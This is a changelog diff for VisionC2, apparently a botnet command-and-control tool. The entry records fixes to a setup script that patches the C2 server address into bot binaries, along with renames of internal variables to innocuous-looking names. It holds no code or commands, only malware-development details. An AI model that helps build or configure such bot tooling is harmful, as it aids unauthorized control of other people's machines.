@@ -3,6 +3,19 @@
 
 All notable changes to the VisionC2 project are documented in this file.
 
+## [2.4.6] - 2026-03-09
+
+### Fixed
+- **`setup.py` not patching C2 URL into bot binaries** — all `re.sub()` calls in `update_bot_main_go()` used stale variable names from before the v2.4.4 rename, so every regex silently matched nothing and the source was never updated; binaries kept the old hardcoded C2 address regardless of what was entered during setup
+  - `encGothTits` → `rawServiceAddr`
+  - `cryptSeed` → `configSeed`
+  - `magicCode` → `syncToken`
+  - `protocolVersion` → `buildTag`
+- **`get_current_config()` reading wrong variable names** — "C2 URL Update Only" mode (option 2) failed to find existing config values for the same reason; fixed to match the renamed constants
+- **`update_bot_debug_mode()` targeting non-existent variable** — regex looked for `debugMode` but config.go uses `verboseLog` since v2.4.4; debug mode toggle had no effect
+
+---
+
 ## [2.4.5] - 2026-03-07
 
 ### Changed
